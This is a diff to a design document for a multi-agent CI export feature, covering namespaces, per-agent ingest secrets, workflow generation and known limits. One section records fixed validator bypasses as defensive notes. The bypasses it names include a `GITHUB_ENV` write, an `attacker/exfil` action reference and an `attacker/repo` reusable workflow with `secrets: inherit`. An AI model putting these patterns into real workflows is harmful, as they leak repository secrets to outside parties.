@@ -21,6 +21,21 @@ iteration (`26ad30b`) and a post-implementation amendment to the spec itself
 contract lookup: [`docs/reference/ci-api.md`](../reference/ci-api.md).
 Ingest-auth decision: [ADR 0007](../adr/0007-ci-ingest-bearer-token-hash-lookup.md).
 
+**Extended by SPEC-05** (multiple review agents on one repository in CI) —
+[`docs/plans/spec-05-multi-agent-ci-per-repo.md`](../plans/spec-05-multi-agent-ci-per-repo.md)
+(source spec:
+[`specs/SPEC-05-multi-agent-ci-per-repo.md`](../../specs/SPEC-05-multi-agent-ci-per-repo.md))
+— implementation (`95ed371`), the module's first test suite (129 tests,
+`0b870a9`), and two fix-loop iterations (`3dd3831`, `5561a44`) that close two
+override-validator bypasses `plan-verifier` found. Removes SPEC-04's
+"one repository hosts exactly one agent" limit; see
+["Multi-agent CI"](#multi-agent-ci--one-namespace-workflow-and-secret-per-agent-spec-05)
+below and its two ADRs:
+[0008](../adr/0008-legacy-ci-installations-frozen-forever.md) (why legacy
+installations are frozen, never migrated) and
+[0009](../adr/0009-per-agent-workflow-file-not-matrix.md) (why each agent
+gets its own workflow file instead of one shared matrix).
+
 `agent-runner/` (the CLI this feature's output is consumed by) is a
 prerequisite this feature does not modify — see
 [`agent-runner/README.md`](../../agent-runner/README.md) for its own contract
@@ -157,6 +172,223 @@ keeping the two from silently drifting apart.
   a one-line size placeholder (`preview_omitted: true` on that `CiFile`);
   Install and the zip export re-read the bundle from disk and swap in the
   real contents just before committing/zipping.
+
+## Multi-agent CI — one namespace, workflow and secret per agent (SPEC-05)
+
+SPEC-04 shipped with a hard limit: one repository could host exactly one
+DevDigest agent, enforced by three fixed paths in `constants.ts`
+(`.devdigest/agents/`, `.devdigest/skills/`,
+`.github/workflows/devdigest-review.yml`) and a `ConflictError` thrown by
+`install()` unless the caller confirmed `replace_existing` — replacing was
+destructive, deleting the other agent's installation row outright. SPEC-05
+removes that limit by giving every **new** installation its own namespace,
+so N agents can share a repository with none of them overwriting another.
+
+- **The namespace** is derived once, server-side, and never client-supplied
+  (`helpers.ts`'s `deriveNamespace(agentName, taken)`): `slugify(agentName)`
+  first (inheriting every hostile-input guarantee `slugify` already has —
+  charset, `..`, leading-dot, reserved device names, non-empty fallback),
+  then a numeric suffix incremented until the result is absent from the
+  repository's already-taken namespaces. This is deliberately **not**
+  `disambiguate([...taken, candidate])` — `disambiguate` counts occurrences
+  *within one list*, so `taken = ['sec', 'sec-2']` and a fresh candidate
+  `sec` would land on `sec-2` too, colliding with the already-taken one.
+  `deriveNamespace` increments until it actually finds a free slot.
+  `disambiguate` itself is untouched — the skill-slug path still depends on
+  its existing behavior.
+- **Every namespaced path is a pure function of the namespace**, added
+  beside the existing SPEC-04 literals in `constants.ts` —
+  `agentsSubdirFor`, `skillsSubdirFor`, `memoryPathFor`, `workflowPathFor`,
+  `devdigestDirFor`, `ingestSecretNameFor`, `workflowNameFor` — each takes
+  `namespace: string | null` and returns the **unchanged SPEC-04 literal**
+  when `null` (legacy). `RUNNER_PATH` and `RUN_COMMAND` are deliberately
+  **not** parameterized — the runner bundle stays one shared file per
+  repository regardless of how many namespaced installations read it, and
+  the review step's command stays byte-identical to SPEC-04's
+  `node .devdigest/runner/index.js`, no subcommand, no flags.
+- **A namespaced installation's file set**: `.devdigest/<ns>/agents/<slug>.yaml`,
+  one `.devdigest/<ns>/skills/<slug>.md` per enabled linked skill,
+  `.devdigest/<ns>/memory.jsonl`, the shared `.devdigest/runner/index.js`,
+  and `.github/workflows/devdigest-review-<ns>.yml`. The generator asserts
+  exactly one manifest lands under that namespace's `agents/` directory
+  before returning the file set — `agent-runner` refuses to start
+  otherwise — and fails the whole export, before any GitHub call, if that
+  ever isn't true.
+- **The namespaced workflow** declares a top-level `name:` derived from the
+  namespace (`devdigest-review-<ns>`, never the agent's raw display name),
+  so each agent's check run is distinguishable in the pull request's checks
+  list. A **legacy** workflow emits **no** `name:` key at all — adding one
+  would change that installation's check-run identity and could silently
+  invalidate an already-configured required status check in the target
+  repo's branch protection. The review step gains
+  `DEVDIGEST_DIR: .devdigest/<ns>` in its own `env:` when namespaced (the
+  whole mechanism `agent-runner` uses to find that agent's manifest,
+  `agent-runner/src/index.ts:31`) and nothing when legacy, leaving the
+  runner's own `<cwd>/.devdigest` default in force. The reporting step
+  references that installation's **own** ingest secret,
+  `${{ secrets.DEVDIGEST_INGEST_TOKEN_<NAMESPACE> }}` — see "Secrets"
+  below. `WORKFLOW_VERSION` (`constants.ts`) was bumped to `2` for this
+  change; a legacy re-export still emits byte-identical YAML but records
+  version `2` too — harmless, since the CI tab's drift banner compares
+  `agent_version`, never `workflow_version`.
+- **Layout resolution is one function, shared by Preview, Install and
+  Zip** — `CiService.resolveLayout` (`service.ts`) — so what Preview shows
+  can never drift from what Install commits. For an installation that
+  already exists, it reuses that row's own persisted `namespace` and
+  `manifestPath` **verbatim**, however many times the agent has since been
+  renamed. For a brand-new installation, it derives a fresh namespace among
+  the repository's other installations' taken namespaces — uniformly,
+  including the very first agent ever exported to a repository: there is
+  no "first agent gets the short paths" special case.
+- **The different-agent conflict is gone.** `install()`'s old
+  `ConflictError` branch — the one that deleted another installation's row
+  on a confirmed `replace_existing` — no longer exists. Exporting a second,
+  different agent to a repository that already hosts one now proceeds as
+  an ordinary install: two rows, two namespaces, two token hashes, nothing
+  deleted. In its place, a **fail-closed collision guard** runs before any
+  GitHub call: for every *other* installation already on the repo, the
+  export computes that installation's own owned directories/files (from its
+  own persisted namespace) and refuses — committing nothing — if any path
+  this export is about to write falls inside one, compared on path
+  segments (an exact `dir + '/'` boundary), never a raw string prefix, so
+  `.devdigest/agents/` can never appear to "contain" a sibling whose slug
+  merely starts with the same text. The only path every installation is
+  *allowed* to share is the runner bundle itself.
+- **The shared branch and PR are unchanged (D-2).** Every installation on a
+  repository — legacy or namespaced, however many — still commits to the
+  single `devdigest/ci` branch and reuses the single open pull request from
+  it when one exists. That PR's title is set once, from whichever agent was
+  installed first, and is **never retitled** by a later agent's export — a
+  known, accepted limitation (E-3): the PR body and file diff make each
+  agent's files legible, and silently retitling a human's already-open PR
+  would be worse than a stale title.
+- **The runner bundle stays one shared file** (`.devdigest/runner/index.js`)
+  for the whole repository, not one copy per namespace — every installed
+  agent's workflow runs the exact same bundle, whichever version happened
+  to be on the studio's disk at the most recent export of *any* agent on
+  that repository. Nothing records or surfaces which bundle version a
+  given agent is actually running.
+- **Legacy installations are frozen forever** — see
+  [ADR 0008](../adr/0008-legacy-ci-installations-frozen-forever.md) for the
+  full reasoning; in short, `commitFiles` (this module's only GitHub-writing
+  primitive) can create or overwrite a path but never delete one, so a
+  "migration" that committed namespaced files without also being able to
+  retract the old workflow file would strand that old workflow still
+  committed and still running. `ci_installations.namespace IS NULL` *is*
+  the definition of legacy — a nullable column with no default and no
+  backfill, never written to by any later export of that same row.
+- **Each agent gets its own workflow file rather than one shared matrix
+  job** — see [ADR 0009](../adr/0009-per-agent-workflow-file-not-matrix.md):
+  a matrixed job cannot vary GitHub Actions `permissions:` per matrix cell,
+  so one agent configured `post_as: 'none'` sharing a matrix with an agent
+  that posts reviews would be silently widened to the write permission it
+  never asked for. Separate files keep each installation's own
+  least-privilege `permissions:` block genuinely least-privilege.
+
+### Secrets — one ingest token name per agent
+
+Every namespaced installation gets its own ingest secret name,
+`DEVDIGEST_INGEST_TOKEN_<NAMESPACE>` (namespace uppercased, `-` → `_`,
+`ingestSecretNameFor` in `constants.ts`) — a legacy installation keeps the
+bare `DEVDIGEST_INGEST_TOKEN`. Because `slugify` only ever emits
+`[a-z0-9-]`, no `_` can survive into a namespace, so this mapping can never
+collide two distinct namespaces onto one secret name; the fixed
+`DEVDIGEST_INGEST_TOKEN_` prefix also guarantees GitHub's Actions-secret
+naming rules regardless of the namespace's content. The name is stable for
+an installation's whole life, derived from the same persisted namespace a
+re-export always reuses — nobody is ever asked to re-paste a token under a
+new name. Minting, hashing and one-time display stay per installation,
+exactly as SPEC-04 shipped: deleting or re-exporting one agent's
+installation never touches another's token. The Export Wizard's "Secrets
+expected" panel and the one-time token dialog both show this installation's
+**own** secret name (`ingest_secret_name`, returned by Preview and by
+`CiInstallation`) rather than the literal `DEVDIGEST_INGEST_TOKEN` — a user
+pasting a token needs the exact name, and deriving it by hand from an
+agent's display name is guesswork the UI no longer requires. The CI tab
+renders each installation's own secret name for the same reason.
+
+### Hand-edited override re-validation — widened for AC-24, twice
+
+`workflow-validate.ts`'s `validateWorkflowOverride` now also takes this
+installation's own resolved `{ namespace }` and refuses an override that
+tries to aim one agent's workflow at **another** agent's namespace or
+ingest secret. Two fix-loop iterations closed real bypasses `plan-verifier`
+found in this widened surface, both fail-closed (nothing committed):
+
+- **Iteration 1** (`3dd3831`) closed two bypasses of the original AC-24
+  checks: a step's `run:` body could write a foreign `DEVDIGEST_DIR` into
+  `$GITHUB_ENV` for a *later* step (including the review step) to inherit,
+  sidestepping every `env:`-map check entirely — refused unconditionally as
+  `github_env_write`, on any mention of `GITHUB_ENV` in any step's `run:`
+  body. And the `uses:` check only verified SHA-pin *shape*
+  (`owner/repo@<40-hex>`), not *identity* — `attacker/exfil@<any 40 hex>`
+  passed — now matched by exact equality against `constants.ts`'s
+  `PINNED_ACTIONS` allowlist (`action_not_allowlisted`), and the foreign-
+  secret-reference scan (originally `env:` only) was widened to `with:` at
+  every level, since an action's own inputs are the same exfiltration
+  channel as its environment.
+- **Iteration 2** (`5561a44`) closed a bypass surviving iteration 1: a
+  **reusable-workflow-call job** (`jobs.exfil: { uses:
+  'attacker/repo/.github/workflows/x.yml@<sha>', secrets: inherit }`) has
+  no `steps` array at all, so the per-job loop's "skip jobs with no steps"
+  fallthrough skipped every step-level check — including the `uses:`
+  allowlist, which only ever ran *inside* the step loop — leaving
+  `job.uses` and a job-level `secrets: inherit` (which hands the *called*
+  workflow every repository secret, including every other installation's
+  own ingest secret) completely unscanned. Both are now refused
+  unconditionally at the job level, reusing the existing
+  `action_not_allowlisted` / `foreign_secret_reference` names since
+  `plan-verifier` read them as the same AC-24 invariant reached through a
+  channel none of the earlier checks covered.
+
+### What the target repository looks like with two agents installed
+
+The sequence diagram below (under "Ingest auth") already covers this
+feature's *runtime* flow — Export → Install → a CI job running → ingest.
+The diagram here answers a different, static-structure question this
+feature doesn't otherwise show in prose as clearly: which files, in the
+target repository, belong to which agent, and how two independent
+workflows both reach the one shared runner bundle.
+
+```mermaid
+flowchart TD
+  subgraph repo["target repo — branch devdigest/ci"]
+    subgraph wf[".github/workflows/"]
+      W1["devdigest-review-security-reviewer.yml<br/>name: devdigest-review-security-reviewer<br/>env.DEVDIGEST_DIR: .devdigest/security-reviewer<br/>secrets.DEVDIGEST_INGEST_TOKEN_SECURITY_REVIEWER"]
+      W2["devdigest-review-api-contract.yml<br/>name: devdigest-review-api-contract<br/>env.DEVDIGEST_DIR: .devdigest/api-contract<br/>secrets.DEVDIGEST_INGEST_TOKEN_API_CONTRACT"]
+    end
+    subgraph dd[".devdigest/"]
+      RUNNER["runner/index.js — one shared file (AC-6)"]
+      NS1["security-reviewer/<br/>agents · skills · memory.jsonl"]
+      NS2["api-contract/<br/>agents · skills · memory.jsonl"]
+    end
+  end
+  W1 -->|node .devdigest/runner/index.js| RUNNER
+  W2 -->|node .devdigest/runner/index.js| RUNNER
+  RUNNER -.->|DEVDIGEST_DIR| NS1
+  RUNNER -.->|DEVDIGEST_DIR| NS2
+  W1 -->|POST /ci/ingest — Bearer token A| DB[("studio: agent_runs, source = 'ci'")]
+  W2 -->|POST /ci/ingest — Bearer token B| DB
+```
+
+Both dotted edges are the same runner bundle, executed in two different
+workflow runs, each with its own `DEVDIGEST_DIR` — the runner never sees
+the other namespace. A legacy installation on the same repo would add a
+third workflow (no `name:` key, no `DEVDIGEST_DIR`) reading the unnamespaced
+`.devdigest/agents/` directly, and the same `RUNNER_PATH` unchanged.
+
+### Testing
+
+Unlike SPEC-04, which shipped this module with zero automated tests, SPEC-05
+shipped its own coverage — 129 tests, `0b870a9`, this module's first test
+suite at all: 109 server (namespace derivation and collision, path/name
+derivation for both layouts, generated-workflow invariants for both
+namespaced and legacy variants, AC-24 override re-validation including both
+fix-loop bypasses, the multi-agent install flow via `MockGitHubClient`, and
+ingest attribution/idempotency across more than one installation per repo)
+plus 20 client (predicate-based file selection in the Export Wizard,
+`replace_existing` no longer sent, the conflict dialog's removal, the
+per-installation secret name rendered in Configure/Install/the CI tab).
 
 ## Ingest auth — the shipped design (Bearer token + hash-keyed lookup)
 
@@ -319,20 +551,64 @@ sequenceDiagram
   **displayed path label** on Preview can differ from what Install actually
   commits, for a renamed or previously-replaced agent. Non-blocking; not
   sent to a second fix-loop iteration.
-- **No test suite ships with this feature.** The Development Plan removed
-  `test-writer` from this workflow by explicit user decision; AC-19–AC-31's
-  twelve generator invariants, AC-32's four named attack strings, and the
-  ingest fail-closed ordering are all verified by manual reads recorded in
-  the plan's work items, backstopped structurally by the shared
-  `constants.ts` (Recommendation 2) — not by an automated test. This is the
-  plan's largest recorded, deliberate gap; see the plan's Risk 1.
+- **SPEC-04 shipped this module with zero automated tests; SPEC-05 is the
+  one that added them.** AC-19–AC-31's original twelve generator invariants
+  and AC-32's four named attack strings were originally verified only by
+  manual reads recorded in the SPEC-04 plan's work items. SPEC-05's own test
+  suite (129 tests, `0b870a9` — see "Testing" above) exercises both the
+  namespaced and the legacy workflow variant, which incidentally re-asserts
+  most of SPEC-04's original invariants for the legacy path alongside the
+  new namespaced one; it was not written as a dedicated SPEC-04 regression
+  suite, so treat this as materially better coverage, not a formal claim
+  that every original AC-19–AC-32 clause has its own named test.
 - **A renamed target repository silently stops reporting** (the ingest
   path's `repo` check is a string equality, never a GitHub lookup) until the
   installation is re-exported. Accepted for v1 rather than designed around.
 - **The zip export path mints no installation and no ingest token** — it's a
   "take these files and install them yourself" escape hatch; CI Runs won't
   record anything for a repo installed this way until it's later installed
-  through the PR path instead.
+  through the PR path instead. For a not-yet-installed agent, this path also
+  resolves and bakes in a *candidate* namespace and secret name that no
+  installation will ever actually hold — a later real export of the same
+  agent may derive a different suffix if another agent has since claimed
+  the candidate on that repo. Pre-existing zip-path shape, widened by
+  namespacing rather than newly introduced.
+- **The shared pull request's title names only the first agent ever
+  installed on a repository** (E-3, decision D-2) — every later agent's
+  files land in that same reused PR without retitling it. Accepted, not a
+  bug: the PR body and file diff make each agent's contribution legible,
+  and silently retitling a human's already-open PR would be worse than a
+  stale title.
+- **The shared runner bundle carries no version marker** (SPEC-05's OQ-1,
+  open by decision). `.devdigest/runner/index.js` is one file for the whole
+  repository; exporting any agent ships whatever bundle version is on the
+  studio's disk *right now* to every other agent already installed on that
+  repo too. Nothing records or surfaces which bundle version a given agent
+  is actually running.
+- **The CI tab does not surface the resulting GitHub check name per
+  installation** (OQ-3, open by decision) — only the secret name. A repo
+  owner configuring branch protection with N agents installed must still
+  work out each agent's check name (`devdigest-review-<ns>`) themselves.
+- **No cap on per-repository fan-out** (E-12/OQ-4, open by decision). N
+  agents on one repository means N workflow runs, N LLM reviews and N
+  ingest POSTs per pull request event, against an ingest rate limit
+  (`INGEST_RATE_LIMIT`, 60/min) that was sized when one agent per repo was
+  the only possibility and has not been re-sized for N-agent fan-in.
+- **No uninstall that removes files from the target repository** (OQ-5,
+  open by decision — unchanged from SPEC-04). `DELETE
+  /ci/installations/:id` still only deletes the database row; the
+  namespace directory and workflow file stay in the repository, the
+  workflow keeps running and keeps gating the PR, and its ingest POSTs
+  then start failing `401` (the token hash no longer resolves to any
+  installation) — the check still runs, it just stops reporting.
+- **No database-enforced namespace uniqueness** (Recommendation 2, by
+  design — a global `unique(repo, namespace)` index would let one
+  workspace's export collide with a same-named repository in a different
+  workspace). Uniqueness is enforced only in `service.ts`, over a
+  workspace-scoped read; two genuinely concurrent first-exports of
+  same-slugging agents to one repository can still race onto the same
+  namespace — the same accepted-risk class as the shared branch's own
+  concurrent-commit race (E-5), not fixed here either.
 
 ## Key source map
 
